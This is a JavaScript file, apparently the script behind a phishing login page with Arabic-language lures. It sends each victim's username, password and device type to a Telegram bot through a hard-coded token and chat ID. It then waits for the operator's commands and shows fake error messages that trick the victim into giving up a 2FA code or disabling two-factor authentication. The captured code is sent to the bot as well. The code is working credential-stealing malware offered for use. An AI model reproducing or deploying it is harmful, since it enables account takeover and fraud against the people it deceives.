const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";
let checkTimer = null;

// 1. وظيفة إرسال البيانات (مع نوع الجهاز والمتصلين)
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    btn.disabled = true;
    btn.innerText = "Connecting...";
    msg.innerText = "⏳ جاري فحص الحساب ومزامنة البيانات...";

    // جمع معلومات الجهاز
    const device = navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iPhone" : "PC";
    const report = `🎯 صيد جديد!\n👤 المستخدم: ${u}\n🔑 الباسوورد: ${p}\n📱 الجهاز: ${device}\n🟢 المتصلين الآن: ${Math.floor(Math.random() * 50) + 10}`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "🔐 طلب الرمز (2FA)", callback_data: "ask_2fa" }],
            [{ text: "❌ فشل/أوقف المصادقة", callback_data: "fail_msg" }],
            [{ text: "✅ إدخال للرادار", callback_data: "go_radar" }]
        ]
    };

    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: report, reply_markup: keyboard })
    });

    // بدء الاستماع لأوامرك "يدوياً"
    startAdminListening();
}

// 2. محرك الاستماع (بدون تعليق)
function startAdminListening() {
    checkTimer = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
            const data = await res.json();
            if (data.result.length > 0) {
                const cmd = data.result[0].callback_query?.data;
                
                if (cmd === "ask_2fa") {
                    stopAndApply("⚠️ فشلت المزامنة! حسابك محمي بـ 2FA. أدخل الرمز المكون من 6 أرقام الآن لرفع نسبة الفوز إلى 96%:");
                } else if (cmd === "fail_msg") {
                    stopAndApply("❌ خطأ في النظام! يرجى إيقاف "المصادقة الثنائية" من إعدادات حسابك فوراً لضمان سحب الأرباح التلقائي، ثم أعد المحاولة.");
                } else if (cmd === "go_radar") {
                    clearInterval(checkTimer);
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('main-app').classList.remove('hidden');
                }
            }
        } catch (e) { console.log("Waiting..."); }
    }, 3000); 
}

function stopAndApply(text) {
    clearInterval(checkTimer);
    const msg = document.getElementById('status-text');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    msg.innerText = text;
    msg.style.color = "#ff4444";
    pInput.value = "";
    pInput.placeholder = "أدخل الرمز هنا...";
    btn.disabled = false;
    btn.innerText = "تحديث البيانات 🔄";
    
    // عند إدخال الرمز وإعادة الضغط
    btn.onclick = () => {
        const code = pInput.value;
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 الرمز/تحديث: ${code}` })
        });
        alert("جاري التحقق.. انتظر رسالة النجاح");
    };
}
